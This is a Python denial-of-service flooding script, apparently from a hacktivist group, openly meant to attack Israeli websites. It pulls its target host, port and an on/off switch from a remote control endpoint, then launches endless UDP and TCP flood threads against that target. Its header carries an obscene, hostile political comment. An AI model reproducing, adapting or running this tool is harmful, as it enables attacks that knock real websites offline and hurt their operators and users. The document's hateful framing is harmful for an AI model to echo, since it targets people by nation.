# Coded By Mr.SaMi
# Using Python3.11.0 
# Attack in website of israel (Fuck israel)
# طوفان الاقصى
import socket
import random
import time
import sys
import os
import requests
import platform
import time
import threading
try:
    import pyfiglet
except:
    os.system('pip install pyfiglet')

red = "\033[1;31m"
green = "\033[1;32m"
cyan = "\033[1;36m"

# Coded By Mr.SaMi
target_api = "https://attack-1915.attack-ye.repl.co/attack.json"
attack = requests.get(target_api).json()
target_host = attack["attack"]["host"]
target_port = attack["attack"]["port"]
sent_api = attack["attack"]["sent"]

# Coded By Mr.SaMi

def clear():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

# Coded By Mr.SaMi
def banner():
    ip = socket.gethostbyname(target_host)
    sami = pyfiglet.Figlet(font="slant")
    banner = sami.renderText("1915 ATTACER")
    print(f"""{red}{banner}

{green}============================
{red}[+] HOST 》{green}{target_host}
{red}[+] PORT 》{green}{target_port}
{red}[+] IP 》{green}{ip}
{red}[+] Number Of Attack 》{green}{sent_api}
{red}[+] {green}Coded By 1915 Team
{green}============================
    
    """)



log_level = 2
# Coded By Mr.SaMi

def log(text, level=1):
    if log_level >= level:
        print(text)

# Coded By Mr.SaMi
def read_proxies():
    with open('proxy.txt', 'r') as f:
        proxies = f.read().splitlines()
    return proxies


# Coded By Mr.SaMi
udp_attack_host = target_host
udp_attack_port = target_port

tcp_attack_host = target_host
tcp_attack_port = target_port

# Coded By Mr.SaMi
def udp_attack():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    proxies = read_proxies()
    sent = 0
    while True:
        if sent != sent_api:
            try:
                proxy = random.choice(proxies)
                proxy_host, proxy_port = proxy.split(':')
                client.sendto(proxy.encode(), (udp_attack_host, udp_attack_port))
                log(f"{red}[ × ] 1915 Atacker ==》 {green} {udp_attack_host}:{udp_attack_port} {red}•• [{sent}]", level=2)
                sent += 1
            except:
                pass 
    client.close()

# Coded By Mr.SaMi
def tcp_attack():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxies = read_proxies()
    sent = 0
    while True:
        if sent != sent_api:
            try:
                proxy = random.choice(proxies)
                proxy_host, proxy_port = proxy.split(':')
                client.connect((tcp_attack_host, tcp_attack_port))
                client.send(proxy.encode())
                log(f"{red}[ × ] 1915 Atacker ==》 {green}  {tcp_attack_host}:{tcp_attack_port} {red}•• [{sent}]", level=2)
                sent += 1
            except:
                pass
    client.close()

# Coded By Mr.SaMi
def main():
    clear()
    banner()
    time.sleep(10)
    if attack["attack"]["attack"] == "yes":
        threading.Thread(target=udp_attack).start()
        threading.Thread(target=tcp_attack).start()
    else:
        print(f"{red}[ ! ] The attack feature is disabled.")


main()